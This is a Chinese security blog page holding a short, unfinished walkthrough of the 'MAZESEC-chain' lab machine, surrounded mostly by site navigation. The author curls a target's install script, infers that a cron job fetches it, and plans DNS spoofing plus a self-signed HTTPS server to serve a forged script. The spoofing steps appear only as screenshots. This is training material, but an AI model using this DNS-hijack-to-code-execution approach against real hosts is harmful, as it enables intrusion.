@@ -1,0 +1,308 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>MAZESEC-chain | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"ta0.fun","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="端口扫描PORT   STATE SERVICE 22&#x2F;tcp open  ssh 80&#x2F;tcp open  http  dns欺骗 只有这个 root@kali2 [~] ➜  curl https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;ll104567&#x2F;d2VsY29tZTpqdW1v&#x2F;refs&#x2F;heads&#x2F;main&#x2F;install.sh                apt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MAZESEC-chain">
+<meta property="og:url" content="http://ta0.fun/posts/2fc2226d/index.html">
+<meta property="og:site_name" content="ta0的小站">
+<meta property="og:description" content="端口扫描PORT   STATE SERVICE 22&#x2F;tcp open  ssh 80&#x2F;tcp open  http  dns欺骗 只有这个 root@kali2 [~] ➜  curl https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;ll104567&#x2F;d2VsY29tZTpqdW1v&#x2F;refs&#x2F;heads&#x2F;main&#x2F;install.sh                apt">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20251010102624787.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20251010103054637.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20251010103138877.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20251010111209415.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20251010121005095.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20251010121107154.png">
+<meta property="og:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20251010121127040.png">
+<meta property="article:published_time" content="2025-10-11T03:16:08.275Z">
+<meta property="article:modified_time" content="2025-10-11T03:17:52.200Z">
+<meta property="article:author" content="ta0">
+<meta property="article:tag" content="dns_spoof">
+<meta property="article:tag" content="apt_spoof">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20251010102624787.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container sidebar-open"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">153</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">17</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">221</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr class="sidebar-hr" style="margin:0.5rem 0 0.5rem 0;"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><!-- 友链按钮并排放在社交区--><a class="links-of-author-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><!-- 黑暗模式按钮也并排--><a class="links-of-author-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dns%E6%AC%BA%E9%AA%97"><span class="toc-number">2.</span> <span class="toc-text">dns欺骗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#apt%E6%BA%90%E4%BC%AA%E9%80%A0"><span class="toc-number">3.</span> <span class="toc-text">apt源伪造</span></a></li></ol></div></div></div><!-- 侧边栏底部空白区域展示目录--><!-- 分类目录区域，所有分类默认收缩--><hr class="sidebar-hr" style="margin:0.5rem 0 0.5rem 0;"><div class="sidebar-bottom-categories" style="margin-top:0.5rem;padding:1rem 0;"><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">CTFWP</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/4b74e7f2/">2023WMCTF ez_java_again_rev</a></li><li class="sidebar-cat-post"><a href="/posts/b891edcc/">2023aliyunCTF-Bypassit1</a></li><li class="sidebar-cat-post"><a href="/posts/125ab785/">2023羊城杯Ez_java</a></li><li class="sidebar-cat-post"><a href="/posts/996ba1d8/">2023巅峰极客BabyURL</a></li><li class="sidebar-cat-post"><a href="/posts/c292ee15/">BaseCTF-scxml</a></li><li class="sidebar-cat-post"><a href="/posts/7d623870/">GYCTF2020-Easyphp</a></li><li class="sidebar-cat-post"><a href="/posts/9d1ed1c9/">LitCTF2024个人题解</a></li><li class="sidebar-cat-post"><a href="/posts/bd91e42f/">LitCTF2024未解题复现</a></li><li class="sidebar-cat-post"><a href="/posts/91008f23/">VNCTF2025复现</a></li><li class="sidebar-cat-post"><a href="/posts/545cd3ac/">XYCTF个人wp</a></li><li class="sidebar-cat-post"><a href="/posts/7345579c/">XYCTF未解题复现</a></li><li class="sidebar-cat-post"><a href="/posts/2f532906/">网鼎杯2020玄武组SSRFMe</a></li><li class="sidebar-cat-post"><a href="/posts/4cfd8fa8/">DownunderCTf复现</a></li><li class="sidebar-cat-post"><a href="/posts/4666d2e/">帕鲁杯my love复现</a></li><li class="sidebar-cat-post"><a href="/posts/43176253/">国城杯web复现</a></li><li class="sidebar-cat-post"><a href="/posts/92fba657/">某不知名CTF比赛</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">AD</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/3e4e3078/">LDAP协议</a></li><li class="sidebar-cat-post"><a href="/posts/b774aeb/">NTLM协议</a></li><li class="sidebar-cat-post"><a href="/posts/636860d3/">AD攻击</a></li><li class="sidebar-cat-post"><a href="/posts/2d21762d/">Kerberos协议</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">应急取证</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/22f8a4f5/">2024网鼎杯半决赛安全运营挑战赛</a></li><li class="sidebar-cat-post"><a href="/posts/cc783675/">第一章-应急响应-Linux日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/c8f379ac/">第二章-应急响应-apache日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/9c3ca66c/">webshell查杀</a></li><li class="sidebar-cat-post"><a href="/posts/a04aefa7/">应急加固-医院脱库应急处理</a></li><li class="sidebar-cat-post"><a href="/posts/e0ad1852/">应急响应靶场(1)</a></li><li class="sidebar-cat-post"><a href="/posts/efc85f7f/">应急靶场-Linux入侵排查</a></li><li class="sidebar-cat-post"><a href="/posts/4844d267/">应急靶场-redis应急</a></li><li class="sidebar-cat-post"><a href="/posts/beb16a0d/">应急靶场-mysql应急</a></li><li class="sidebar-cat-post"><a href="/posts/42c3bb70/">日志分析-IIS日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/83be2f6e/">第九章-blueteam 的小心思</a></li><li class="sidebar-cat-post"><a href="/posts/f79382a3/">第一届&quot;帕鲁杯&quot;wp</a></li><li class="sidebar-cat-post"><a href="/posts/28af606d/">第二届帕鲁杯应急响应wp</a></li><li class="sidebar-cat-post"><a href="/posts/bd7d5e3d/">第二届长城杯&amp;CISCN半决赛-应急响应</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">cyberstrikelab</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/3c15bfe8/">ATT&amp;CK实战框架-lab9</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">流量分析</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/864938c/">CobaltStrike流量分析</a></li><li class="sidebar-cat-post"><a href="/posts/a70a62d9/">CobaltStrike4.0流量分析</a></li><li class="sidebar-cat-post"><a href="/posts/ae37354d/">哥斯拉ekp版本流量分析</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">WEB安全</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/5b4d21b4/">DOM Clobbering</a></li><li class="sidebar-cat-post"><a href="/posts/7705fe97/">JDK17下的CC链分析</a></li><li class="sidebar-cat-post"><a href="/posts/b88a52de/">Spring jdk17原生链</a></li><li class="sidebar-cat-post"><a href="/posts/f02bb322/">用友U8 Cloud IPFxxFileService 文件上传限制不当漏洞</a></li><li class="sidebar-cat-post"><a href="/posts/1bb25fe1/">JAVA常见内存马</a></li><li class="sidebar-cat-post"><a href="/posts/31287ede/">Langflow权限提升漏洞</a></li><li class="sidebar-cat-post"><a href="/posts/57292570/">用友U8 Cloud FileManageServlet/LoginVideoServlet反序列化</a></li><li class="sidebar-cat-post"><a href="/posts/323bf891/">用友U8 Cloud NCCloudGatewayServlet接口 命令执行漏洞</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">HackMyVM-Labs</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/45ea257e/">lab-Temperance</a></li><li class="sidebar-cat-post"><a href="/posts/13a562a7/">HackMyVM-Hades</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">HackMyVM</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/a88f73eb/">HackMyVM-Airbind</a></li><li class="sidebar-cat-post"><a href="/posts/724f9cb4/">HackMyVM-Apaches</a></li><li class="sidebar-cat-post"><a href="/posts/b1859e86/">HackMyVM-BaseME</a></li><li class="sidebar-cat-post"><a href="/posts/2e3aa93f/">HackMyVM-Canto</a></li><li class="sidebar-cat-post"><a href="/posts/16d10af0/">HackMyVM-Casino</a></li><li class="sidebar-cat-post"><a href="/posts/3e3f7c7d/">HackMyVM-CodeShield</a></li><li class="sidebar-cat-post"><a href="/posts/65d8e1a1/">HackMyVM-Birthday</a></li><li class="sidebar-cat-post"><a href="/posts/151f8aa9/">HackMyVM-Comet</a></li><li class="sidebar-cat-post"><a href="/posts/61f88fc9/">HackMyVM-Convert</a></li><li class="sidebar-cat-post"><a href="/posts/9c57f07c/">HackMyVM-DC02</a></li><li class="sidebar-cat-post"><a href="/posts/55ea1c6/">HackMyVM-DC01</a></li><li class="sidebar-cat-post"><a href="/posts/b99628b9/">HackMyVM-Dentacare</a></li><li class="sidebar-cat-post"><a href="/posts/4dfb16e2/">HackMyVM-Echoed</a></li><li class="sidebar-cat-post"><a href="/posts/75345549/">HackMyVM-DC04</a></li><li class="sidebar-cat-post"><a href="/posts/201f4a94/">HackMyVM-Friendly</a></li><li class="sidebar-cat-post"><a href="/posts/13e2841d/">HackMyVM-Inkplot</a></li><li class="sidebar-cat-post"><a href="/posts/709c1b3d/">HackMyVM-Hell</a></li><li class="sidebar-cat-post"><a href="/posts/b9453620/">HackMyVM-Liar</a></li><li class="sidebar-cat-post"><a href="/posts/ed97f61a/">HackMyVM-Friendly2</a></li><li class="sidebar-cat-post"><a href="/posts/65c2fc62/">HackMyVM-Lookup</a></li><li class="sidebar-cat-post"><a href="/posts/3d6a4d0/">HackMyVM-Logan</a></li><li class="sidebar-cat-post"><a href="/posts/dee12de6/">HackMyVM-NightCity</a></li><li class="sidebar-cat-post"><a href="/posts/a8d85fe0/">HackMyVM-Nightfall</a></li><li class="sidebar-cat-post"><a href="/posts/85f65919/">HackMyVM-Principle</a></li><li class="sidebar-cat-post"><a href="/posts/b9be1174/">HackMyVM-Observer</a></li><li class="sidebar-cat-post"><a href="/posts/1c8b7cf7/">HackMyVM-Puiblishe</a></li><li class="sidebar-cat-post"><a href="/posts/8349b408/">HackMyVM-Satori</a></li><li class="sidebar-cat-post"><a href="/posts/54a57065/">HackMyVM-Simple</a></li><li class="sidebar-cat-post"><a href="/posts/3ca28c17/">HackMyVM-Tiny</a></li><li class="sidebar-cat-post"><a href="/posts/e117db9f/">HackMyVM-University</a></li><li class="sidebar-cat-post"><a href="/posts/637ff6f0/">HackMyVM-TriplAdvisor</a></li><li class="sidebar-cat-post"><a href="/posts/601a25e4/">HackMyVM-Stars</a></li><li class="sidebar-cat-post"><a href="/posts/6c34648c/">HackMyVM-Za_1</a></li><li class="sidebar-cat-post"><a href="/posts/7387f134/">HackMyVM-Aurora</a></li><li class="sidebar-cat-post"><a href="/posts/1cc64d1/">HackMyVM-bounty</a></li><li class="sidebar-cat-post"><a href="/posts/99a1cbb9/">HackMyVM-Chronos</a></li><li class="sidebar-cat-post"><a href="/posts/50cc8bce/">HackMyVM-colors</a></li><li class="sidebar-cat-post"><a href="/posts/a4e579f8/">HackMyVM-crack</a></li><li class="sidebar-cat-post"><a href="/posts/eb50c0ea/">HackMyVM-DC03</a></li><li class="sidebar-cat-post"><a href="/posts/48bf01e2/">HackMyVM-djinn</a></li><li class="sidebar-cat-post"><a href="/posts/6b328076/">HackMyVM-eyes</a></li><li class="sidebar-cat-post"><a href="/posts/1861442f/">HackMyVM-friendly3</a></li><li class="sidebar-cat-post"><a href="/posts/f5427d41/">HackMyVM-hundred</a></li><li class="sidebar-cat-post"><a href="/posts/3d50af75/">HackMyVM-Leet</a></li><li class="sidebar-cat-post"><a href="/posts/42ff075e/">HackMyVM-Literal</a></li><li class="sidebar-cat-post"><a href="/posts/5e0f535b/">HackMyVM-Printer</a></li><li class="sidebar-cat-post"><a href="/posts/a583b130/">HackMyVM-dejavu</a></li><li class="sidebar-cat-post"><a href="/posts/8a0eae7/">HackMyVM-oliva</a></li><li class="sidebar-cat-post"><a href="/posts/794033c8/">HackMyVM-tranquil</a></li><li class="sidebar-cat-post"><a href="/posts/2c430ca5/">HackMyVM-troya</a></li><li class="sidebar-cat-post"><a href="/posts/3e9b59e6/">HackMyVM-Kitty</a></li><li class="sidebar-cat-post"><a href="/posts/28f0aa43/">HackMyVM-thwall</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">MAZESEC</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/d2450660/">MazeSec-ta0</a></li><li class="sidebar-cat-post"><a href="/posts/24db92f0/">MazeSec-DevOoos</a></li><li class="sidebar-cat-post"><a href="/posts/47da5ee2/">MazeSec-ajpsrv</a></li><li class="sidebar-cat-post"><a href="/posts/78989591/">MazeSec-motto</a></li><li class="sidebar-cat-post"><a href="/posts/b298e578/">MazeSec-Bicker</a></li><li class="sidebar-cat-post"><a href="/posts/fbd08121/">MazeSec-Novice</a></li><li class="sidebar-cat-post"><a href="/posts/2fc2226d/">MAZESEC-chain</a></li><li class="sidebar-cat-post"><a href="/posts/75928fc0/">MAZESEC-Delete</a></li><li class="sidebar-cat-post"><a href="/posts/10540780/">MAZESEC-Ronos</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">OverTheWire</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/dafc866f/">OverTheWire-Bandit</a></li><li class="sidebar-cat-post"><a href="/posts/c70009a1/">OverTheWire-Natas</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">thehackerlabs</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/92742d47/">thehackerslabs-BLACKGOD</a></li><li class="sidebar-cat-post"><a href="/posts/93aa912/">thehackerslabs-Curiosity</a></li><li class="sidebar-cat-post"><a href="/posts/d94b1923/">thehackerslabs-Mentallity</a></li><li class="sidebar-cat-post"><a href="/posts/3b1290b8/">thehackerslabs-La Casa Del Jamón</a></li><li class="sidebar-cat-post"><a href="/posts/9e62c57a/">thehackerslabs-Curiosity3</a></li><li class="sidebar-cat-post"><a href="/posts/d94efc54/">thehackerslabs-Pildoritas</a></li><li class="sidebar-cat-post"><a href="/posts/273d8e90/">thehackerslabs-elcandidato</a></li><li class="sidebar-cat-post"><a href="/posts/8df01d3/">thehackerslabs-Big</a></li><li class="sidebar-cat-post"><a href="/posts/e965f5ec/">thehackerslabs-Curiosity2</a></li><li class="sidebar-cat-post"><a href="/posts/c36651be/">thehackerslabs-Pacharan</a></li><li class="sidebar-cat-post"><a href="/posts/19aecb8c/">thehackerslabs-Paella</a></li><li class="sidebar-cat-post"><a href="/posts/2e40fc49/">thehackerslabs-Chimichurri</a></li><li class="sidebar-cat-post"><a href="/posts/a8a9f8e9/">thehackerslabs-Doraemon</a></li><li class="sidebar-cat-post"><a href="/posts/e23e0315/">thehackerslabs-Offensive</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">CVE复现</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/dcc68ae8/">Thinkphp3.2.x命令执行</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Vulnyx</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/20dbae8a/">Vulnyx-Admin</a></li><li class="sidebar-cat-post"><a href="/posts/1a843bca/">Vulnyx-Anon</a></li><li class="sidebar-cat-post"><a href="/posts/c9c80648/">Vulnyx-Eternal</a></li><li class="sidebar-cat-post"><a href="/posts/3a160b8e/">Vulnyx-Experience</a></li><li class="sidebar-cat-post"><a href="/posts/66723be2/">Vulnyx-tunnel</a></li><li class="sidebar-cat-post"><a href="/posts/b53d3c5e/">Vulnyx-send</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Vulnhub</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/a5814cc3/">Vulnhub-64base</a></li><li class="sidebar-cat-post"><a href="/posts/b7e54991/">Vulnhub-Mercy</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Web安全</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/e9731bcd/">Weblogic漏洞</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">渗透</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/ca796a/">域控-Offensive</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">春秋云境</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/b6e8119b/">春秋云境-Brute4Road</a></li><li class="sidebar-cat-post"><a href="/posts/3a283e32/">春秋云境-Certify</a></li><li class="sidebar-cat-post"><a href="/posts/93b35a6e/">春秋云境-Delegation</a></li><li class="sidebar-cat-post"><a href="/posts/952d1a58/">春秋云境-Exchange</a></li><li class="sidebar-cat-post"><a href="/posts/f8a60ebc/">春秋云境-GreatWall</a></li><li class="sidebar-cat-post"><a href="/posts/f85c7fea/">春秋云境-Flarum</a></li><li class="sidebar-cat-post"><a href="/posts/cb0f9c73/">春秋云境-Privilege</a></li><li class="sidebar-cat-post"><a href="/posts/a5238ac2/">春秋云境-ThermalPower</a></li><li class="sidebar-cat-post"><a href="/posts/7ea084a1/">春秋云境-Spoofing</a></li><li class="sidebar-cat-post"><a href="/posts/9aa9ec9/">春秋云境-Time</a></li><li class="sidebar-cat-post"><a href="/posts/a0288562/">春秋云境-Tsclient</a></li><li class="sidebar-cat-post"><a href="/posts/beaf5221/">春秋云境-TunnelX</a></li><li class="sidebar-cat-post"><a href="/posts/3731c1f5/">春秋云境-无间计划</a></li><li class="sidebar-cat-post"><a href="/posts/aa8a0593/">春秋云境-CloudNet</a></li><li class="sidebar-cat-post"><a href="/posts/a3698f4a/">春秋云境-Delivery</a></li><li class="sidebar-cat-post"><a href="/posts/d66aab01/">春秋云境-Hospital</a></li><li class="sidebar-cat-post"><a href="/posts/327fc326/">春秋云境-Initial</a></li></ul></details></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://ta0.fun/posts/2fc2226d/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">MAZESEC-chain</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-10-11 11:16:08" itemprop="dateCreated datePublished" datetime="2025-10-11T11:16:08+08:00">2025-10-11</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">1.6k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">9m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/MAZESEC/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">MAZESEC</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/dns-spoof/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">dns_spoof</span></a><a class="tag-item" href="/tags/apt-spoof/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">apt_spoof</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">PORT   STATE SERVICE
+<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
+<span class="token number">80</span>/tcp <span class="token function">open</span>  http</code></pre>
+
+<h2 id="dns欺骗"><a href="#dns欺骗" class="headerlink" title="dns欺骗"></a>dns欺骗</h2><p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20251010102624787.png" alt="image-20251010102624787" loading="lazy"></p>
+<p>只有这个</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  <span class="token function">curl</span> https://raw.githubusercontent.com/ll104567/d2VsY29tZTpqdW1v/refs/heads/main/install.sh               
+<span class="token function">apt</span> <span class="token function">install</span> <span class="token function">wget</span></code></pre>
+
+<p>这个脚本是安装wget，尝试下载整个仓库看一下</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">https://github.com/ll104567/d2VsY29tZTpqdW1v</code></pre>
+
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20251010103054637.png" alt="image-20251010103054637" loading="lazy"></p>
+<p>注意到仓库名字是base64字符串，巨魔</p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20251010103138877.png" alt="image-20251010103138877" loading="lazy"></p>
+<p>并登不上去</p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20251010111209415.png" alt="image-20251010111209415" loading="lazy"></p>
+<p>一顿摸索发现这个仓库被下载到这儿了，它不用git而是用curl，所以我的猜测是会有一个定时任务执行curl获取文件，目的是为了可以打dns劫持。</p>
+<p>尝试一下</p>
+<p>kali : 192.168.172.1</p>
+<p>靶机: 192.168.172.128</p>
+<p>网关: 192.168.172.119</p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20251010121005095.png" alt="image-20251010121005095" loading="lazy"></p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20251010121107154.png" alt="image-20251010121107154" loading="lazy"></p>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/image-20251010121127040.png" alt="image-20251010121127040" loading="lazy"></p>
+<p>然后kali起个https服务</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span>
+└─<span class="token comment"># openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem</span></code></pre>
+
